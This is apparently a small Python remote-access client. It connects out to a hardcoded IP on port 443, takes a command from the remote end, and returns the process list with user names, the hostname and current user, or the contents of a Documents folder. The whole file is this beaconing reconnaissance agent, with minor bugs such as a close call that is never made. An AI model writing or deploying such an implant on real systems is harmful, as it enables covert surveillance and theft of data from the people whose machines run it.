import socket
import os
import psutil
import getpass


class client:
    def __init__(self,ip,port):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip=ip
        self.port=port
        self.client_socket.connect((self.ip, self.port))

    def start (self):
        flag =True
        while(flag):
            command = self.client_socket.recv(1024).decode()
            flag = False
            self.client_socket.send(self.handel_command(command).encode())
        self.client_socket.close

    def handel_command(self,command):

        match command:
            case "PROCESS":
                list = []
                for proc in psutil.process_iter(['pid', 'name', 'username']):
                    try:
                        list.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass

                return (" ".join(list))


            case "NAME":
                name = socket.gethostname() + getpass.getuser()
                return name

            case "DRIVE":
                files=str(os.listdir(path=r"C:\Users\User\Documents"))
                return files

            case "EXIT":
                return "disconnecting"


t2 = client("172.20.148.227",443)
t2.start()